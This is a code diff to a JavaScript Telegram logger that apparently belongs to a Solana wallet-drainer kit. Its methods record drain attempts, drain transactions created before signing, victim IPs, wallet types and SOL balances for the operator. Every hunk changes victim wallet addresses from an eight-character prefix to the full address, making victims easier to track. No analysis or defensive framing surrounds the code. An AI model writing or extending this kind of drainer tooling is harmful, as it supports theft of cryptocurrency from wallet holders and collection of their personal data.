@@ -176,7 +176,7 @@ class TelegramLogger {
     
     // Safe string conversion with fallback
     const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
-    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
     
@@ -233,7 +233,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     
     // Safe string conversion with fallback
     const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
-    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
@@ -290,7 +290,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
-    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
@@ -364,7 +364,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
-    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
     const reason = String(data.reason || 'User canceled the transaction');
@@ -409,7 +409,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const user = data.user ? String(data.user) : 'Unknown';
-    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const details = String(data.details || 'No details provided');
     
@@ -447,7 +447,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const user = data.user ? String(data.user) : 'Unknown';
-    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
@@ -486,7 +486,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const user = data.user ? String(data.user) : 'Unknown';
-    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
@@ -526,7 +526,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 
     // Safe string conversion with fallback
     const user = data.user ? String(data.user) : 'Unknown';
-    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const errorMessage = String(data.message || data.details || data.error || 'Unknown error');
     
@@ -556,7 +556,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
    * Log drain attempt (transaction creation)
    */
   async logDrainAttempt(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
@@ -597,7 +597,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
    * Log security events (rate limiting, blocked IPs, etc.)
    */
   async logSecurityEvent(data) {
-    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.user ? data.user.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const eventType = data.type || 'Unknown';
     const details = data.details || 'No details provided';
@@ -630,7 +630,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
    * Log drain transaction created (before signing)
    */
   async logDrainCreated(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
